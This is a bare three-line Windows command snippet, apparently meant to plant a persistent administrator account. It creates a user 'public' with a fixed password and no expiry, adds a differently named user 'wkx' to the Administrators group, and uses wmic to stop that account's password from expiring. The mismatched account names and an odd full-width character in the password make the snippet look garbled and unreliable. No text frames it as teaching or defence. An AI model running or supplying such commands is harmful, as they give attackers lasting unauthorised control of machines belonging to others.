net user public hld2469？ /add /expires:never
net localgroup Administrators wkx /ADD
wmic UserAccount Where Name="wkx" Set PasswordExpires="false"